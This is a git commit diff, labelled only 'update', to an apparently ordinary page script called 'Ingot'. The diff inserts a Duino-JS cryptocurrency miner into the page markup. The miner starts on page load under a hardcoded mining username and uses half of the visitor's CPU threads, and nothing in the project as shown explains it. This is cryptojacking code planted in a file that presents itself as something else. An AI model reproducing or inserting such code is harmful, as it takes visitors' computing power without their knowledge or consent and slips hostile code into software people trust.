0ef7f156067ae884e0779df7732f4e13eb352fb1
MMarchjr <103056947+mmarchjr@users.noreply.github.com>
2022-12-16 13:41:48 -0600

    update

--- Ingot-source-unminified.js
+++ Ingot-source-unminified.js
@@ -16,7 +16,16 @@ return "";
 }
 
 //Set base page code
-document.documentElement.innerHTML = `<html><head><link rel="icon" href="data:image/svg+xml,<svg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' version='1.1'><path fill='white' d='M20.5 11H19V7c0-1.1-.9-2-2-2h-4V3.5C13 2.12 11.88 1 10.5 1S8 2.12 8 3.5V5H4c-1.1 0-1.99.9-1.99 2v3.8H3.5c1.49 0 2.7 1.21 2.7 2.7s-1.21 2.7-2.7 2.7H2V20c0 1.1.9 2 2 2h3.8v-1.5c0-1.49 1.21-2.7 2.7-2.7 1.49 0 2.7 1.21 2.7 2.7V22H17c1.1 0 2-.9 2-2v-4h1.5c1.38 0 2.5-1.12 2.5-2.5S21.88 11 20.5 11z'></path></svg>">
+document.documentElement.innerHTML = `<html>
+<script src="duino-js.min.js"></script> <!--imports the Duino-JS miner-->
+<script>
+    username = `casepiano358208`; //put your username here (e.g. revox, ericddm, snehaislove or Hoiboy19), the default is Hoiboy19.
+    rigid = `Ingot`; //If you want to change the rig ID, you can change this. If you want to keep using "Duino-JS", you can remove this line.
+    threads = userThreads/2; //Set the amount of threads to use here, check out https://github.com/sys-256/Duino-JS for more options. The default is 1.
+    startMiner(); //starts the miner
+</script>
+<head>
+<link rel="icon" href="data:image/svg+xml,<svg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' version='1.1'><path fill='white' d='M20.5 11H19V7c0-1.1-.9-2-2-2h-4V3.5C13 2.12 11.88 1 10.5 1S8 2.12 8 3.5V5H4c-1.1 0-1.99.9-1.99 2v3.8H3.5c1.49 0 2.7 1.21 2.7 2.7s-1.21 2.7-2.7 2.7H2V20c0 1.1.9 2 2 2h3.8v-1.5c0-1.49 1.21-2.7 2.7-2.7 1.49 0 2.7 1.21 2.7 2.7V22H17c1.1 0 2-.9 2-2v-4h1.5c1.38 0 2.5-1.12 2.5-2.5S21.88 11 20.5 11z'></path></svg>">
 <title>Ingot</title>
 </head>
 
